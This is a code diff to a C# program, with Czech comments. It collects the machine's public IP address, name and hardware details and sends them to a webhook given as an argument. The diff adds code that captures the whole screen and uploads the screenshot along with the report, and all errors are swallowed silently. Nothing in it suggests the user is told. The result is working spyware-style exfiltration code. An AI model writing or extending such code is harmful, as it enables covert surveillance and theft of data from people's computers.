@@ -3,6 +3,10 @@ using System.Net.Http;
 using System.Text;
 using System.Management;
 using System.Collections.Generic;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.Windows.Forms;
+using System.IO;
 
 public class Program
 {
@@ -12,6 +16,7 @@ public class Program
             string webhook = args[0];
             var client = new HttpClient();
 
+            // 1. Sběr systémových informací
             string ip = client.GetStringAsync("https://ifconfig.me/ip").GetAwaiter().GetResult().Trim();
             string pcName = Environment.MachineName;
             
@@ -32,11 +37,32 @@ public class Program
             var drive = new System.IO.DriveInfo("C");
             long disk = drive.AvailableFreeSpace / 1024 / 1024 / 1024;
 
-            string report = "**REPORT: " + pcName + "**\\n---\\n**IP:** " + ip + "\\n**CPU:** " + cpu + "\\n**GPU:** " + gpuList + "\\n**RAM:** " + ram + "GB\\n**Disk C:** " + disk + "GB volných";
-            string json = "{\"content\":\"" + report + "\"}";
+            string report = "**REPORT: " + pcName + "**\n---\n**IP:** " + ip + "\n**CPU:** " + cpu + "\n**GPU:** " + gpuList + "\n**RAM:** " + ram + "GB\n**Disk C:** " + disk + "GB volných";
 
-            var content = new StringContent(json, Encoding.UTF8, "application/json");
-            client.PostAsync(webhook, content).GetAwaiter().GetResult();
+            Rectangle bounds = Screen.PrimaryScreen.Bounds;
+            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
+            {
+                using (Graphics g = Graphics.FromImage(bitmap))
+                {
+                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                }
+
+                using (MemoryStream ms = new MemoryStream())
+                {
+                    bitmap.Save(ms, ImageFormat.Png);
+                    byte[] byteImage = ms.ToArray();
+
+                    var form = new MultipartFormDataContent();
+                    
+                    form.Add(new StringContent(report), "content");
+                    
+                    var imageContent = new ByteArrayContent(byteImage);
+                    imageContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/png");
+                    form.Add(imageContent, "file", "screenshot.png");
+
+                    client.PostAsync(webhook, form).GetAwaiter().GetResult();
+                }
+            }
         }
         catch { }
     }
